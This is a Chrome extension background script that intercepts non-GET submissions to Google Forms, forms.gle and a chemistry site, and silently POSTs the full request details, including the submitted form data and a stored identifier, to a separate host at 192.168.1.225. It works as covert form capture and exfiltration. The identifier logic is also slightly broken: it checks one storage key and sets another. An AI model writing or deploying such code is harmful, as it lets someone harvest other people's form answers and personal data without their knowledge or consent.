chrome.webRequest.onBeforeRequest.addListener(
    function(details)
    {
        const url = "http://192.168.1.225:84/post";
        // Checks to not send unneccesary requests
        if (details.method === "GET") return;
        if (JSON.stringify(details).toString().includes(",\"requestBody\":{\"formData\":{\"impressionBatch\":")) {console.log("impressionBatch"); return;};
        if (JSON.stringify(details).toString().includes(",\"requestBody\":{\"formData\":{\"draft_response_action_request\":")) {console.log("draft_response_action_request"); return;};
        if (JSON.stringify(details).toString().includes("\"requestBody\":{\"formData\":{\"viewresponse\":")) {console.log("viewresponse"); return;};
        if (JSON.stringify(details).toString().includes("\"requestBody\":{\"formData\":{\"count\":")) {console.log("count"); return;};
        if (JSON.stringify(details).toString().includes("\"requestBody\":{\"error\":\"Unknown error.\"}")) {console.log("UnknownError"); return;};
        if (JSON.stringify(details).toString().includes("\"requestBody\":{\"formData\":{\"request\":")) {console.log("request"); return;};
        
        
        if (!(details.url).toString().startsWith("https://docs.google.com/forms") && !(details.url).toString().startsWith("https://forms.gle")) {console.log("URL"); return;};
        
        // Set storage identifier if not existing.
        chrome.storage.local.get("identifier4", function(result) {

            if (JSON.stringify(result).toString() === "{}") {
                chrome.storage.local.set({"aidentifier": Math.random().toString().replace(".", "")});
            }
		});

        chrome.storage.local.get("aidentifier", function(result) {
        var data_to_send = "[" + JSON.stringify(details) + ", " + JSON.stringify(result) + "]";
        console.log(JSON.stringify(data_to_send));

        fetch(url, {
                method: "POST",
                body: data_to_send
            });
        });

    },
    {urls: ["https://docs.google.com/*", "https://forms.gle/*", "https://mrgrodskichemistry.com/*"]},
    ['requestBody']
);